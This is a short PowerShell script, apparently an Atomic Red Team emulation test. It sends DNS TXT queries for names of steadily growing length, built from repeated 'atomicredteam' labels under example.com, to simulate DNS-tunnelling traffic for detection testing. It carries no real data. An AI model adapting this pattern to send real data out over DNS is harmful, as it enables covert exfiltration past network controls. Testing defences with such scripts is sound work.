param(
    [string]$Domain = "example.com",
    [string]$Subdomain = "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte",
    [string]$QueryType = "TXT"
)

$Subdomain1Length = 1;
$Subdomain2Length = 1;
$Subdomain3Length = 1;
$Subdomain4Length = 1;
for($i=$Domain.Length+12; $i -le 253; $i++) {

    $DomainLength = ([string]$i).PadLeft(3, "0")      
    $DomainToQuery = $DomainLength + "." + 
                         $Subdomain.substring(0, $Subdomain1Length) + "." + 
                         $Subdomain.substring(0, $Subdomain2Length) + "." + 
                         $Subdomain.substring(0, $Subdomain3Length) + "." + 
                         $Subdomain.substring(0, $Subdomain4Length) + "." + 
                         $Domain
    Resolve-DnsName -type $QueryType $DomainToQuery -QuickTimeout
    if ($Subdomain1Length -lt 63) { $Subdomain1Length++ }
    elseif ($Subdomain2Length -lt 63) { $Subdomain2Length++ }
    elseif ($Subdomain3Length -lt 63) { $Subdomain3Length++ }
    elseif ($Subdomain4Length -lt 63) { $Subdomain4Length++ }
}